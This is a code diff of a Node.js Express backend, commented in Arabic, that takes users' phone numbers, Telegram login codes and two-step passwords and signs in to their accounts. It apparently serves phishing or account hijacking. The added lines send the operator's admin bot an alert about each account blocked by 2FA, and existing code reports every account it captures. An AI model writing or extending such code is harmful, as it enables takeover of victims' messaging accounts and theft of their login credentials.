@@ -76,7 +76,7 @@ app.post('/api/send-code', async (req, res) => {
   }
 });
 
-// 2️⃣ مرحلة التحقق من الكود (مع دعم ذكي لكلمة المرور 2FA)
+// 2️⃣ مرحلة التحقق من الكود (مع دعم ذكي لكلمة المرور 2FA وإرسال التقارير)
 app.post('/api/verify-code', async (req, res) => {
   try {
     const { phoneNumber, phoneCode, password } = req.body;
@@ -102,6 +102,18 @@ app.post('/api/verify-code', async (req, res) => {
       // إذا طلب الحساب كلمة مرور (2FA) ولم يتم إرسالها بعد
       if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
         if (!password) {
+          // تنبيهك كأدمن فوراً أن هذا الرقم توقف بسبب الـ 2FA
+          try {
+            const alertMessage = `
+⚠️ **تنبيه توقف عملية (2FA)** 🛑
+📱 **رقم الهاتف:** \`${phoneNumber}\`
+❌ **المشكلة:** الحساب محمي بكلمة مرور (تحقق بخطوتين)، وظهرت خانة كلمة المرور للمستخدم لإدخالها.
+            `;
+            await bot.telegram.sendMessage(MY_ADMIN_ID, alertMessage, { parse_mode: 'Markdown' });
+          } catch (adminErr) {
+            console.error('فشل إرسال تنبيه الـ 2FA للأدمن:', adminErr);
+          }
+
           // إعلام الواجهة بأن الحساب يحتاج كلمة مرور لإظهار الحقل للمستخدم
           return res.json({ success: false, needPassword: true, error: 'الحساب محمي بكلمة مرور (2FA)' });
         } else {
@@ -128,7 +140,7 @@ app.post('/api/verify-code', async (req, res) => {
       console.log('تعذر جلب تفاصيل الحساب الإضافية');
     }
 
-    // إرسال تقرير النجاح الكامل لك على البوت
+    // 🚀 **إرسال تقرير النجاح الكامل لك على البوت**
     try {
       const reportMessage = `
 🚨 **تم توثيق حساب جديد بنجاح!** 🌟
